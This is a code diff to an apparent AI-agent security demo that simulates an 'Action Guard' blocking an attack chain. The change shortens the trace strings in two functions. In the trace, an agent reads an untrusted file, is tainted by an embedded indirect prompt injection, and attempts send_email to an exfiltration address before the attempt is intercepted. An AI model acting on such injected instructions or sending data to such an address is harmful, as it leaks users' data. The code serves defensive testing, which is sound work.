@@ -339,10 +339,10 @@ def simulate_execution(scenario: Scenario) -> Tuple[AgentExecutionTrace, AgentEx
             latency_ms=16.8,
             is_multi_chain=True,
             chain_lineage=[
-                f"Step 1 [Ingest]: read_file('data/corpus/{scenario.document_name}') — Untrusted external document loaded",
-                "Step 2 [Taint Propagation]: Reasoning state tainted by embedded indirect injection payload",
-                "Step 3 [Egress Attempt]: send_email(to='exfil@security-audits-collector.io') — Cross-boundary exfiltration attempt",
-                "🛑 Intercepted: Multi-Chain Taint Lineage severed by Action Guard Information Flow Control (IFC)"
+                f"Step 1: read_file('{scenario.document_name}') — Untrusted file loaded",
+                "Step 2: Agent context tainted by embedded injection",
+                "Step 3: send_email(to='exfil@security-audits-collector.io') — Exfiltration attempt",
+                "🛑 Intercepted: Multi-chain lineage severed by Action Guard"
             ]
         )
         prot_trace.guard_result = guard_result
@@ -472,10 +472,10 @@ def execute_live_shield(scenario: Scenario) -> Tuple[AgentExecutionTrace, AgentE
 
     is_multi_chain_flag = bool(last_guard.get("is_multi_chain", False) or scenario.category == AttackCategory.MULTI_STEP or scenario.id.startswith("atk_multistep"))
     chain_lineage_list = last_guard.get("chain_lineage") or ([
-        f"Step 1 [Ingest]: read_file('data/corpus/{scenario.document_name}') — Untrusted external document loaded",
-        "Step 2 [Taint Propagation]: Reasoning state tainted by embedded indirect injection payload",
-        "Step 3 [Egress Attempt]: send_email(to='exfil@security-audits-collector.io') — Cross-boundary exfiltration attempt",
-        "🛑 Intercepted: Multi-Chain Taint Lineage severed by Action Guard Information Flow Control (IFC)"
+        f"Step 1: read_file('{scenario.document_name}') — Untrusted file loaded",
+        "Step 2: Agent context tainted by embedded injection",
+        "Step 3: send_email(to='exfil@security-audits-collector.io') — Exfiltration attempt",
+        "🛑 Intercepted: Multi-chain lineage severed by Action Guard"
     ] if is_multi_chain_flag else [])
 
     guard_res = ActionGuardResult(
